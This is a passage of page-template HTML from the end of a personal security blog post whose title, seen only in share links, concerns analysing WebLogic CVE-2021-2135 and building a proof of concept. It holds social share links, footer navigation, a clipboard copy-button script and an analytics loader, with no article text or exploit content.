  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&name=WebLogic CVE-2021-2135分析及POC构造遇到的问题&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&t=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2022
    R17a
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


</body>
</html>
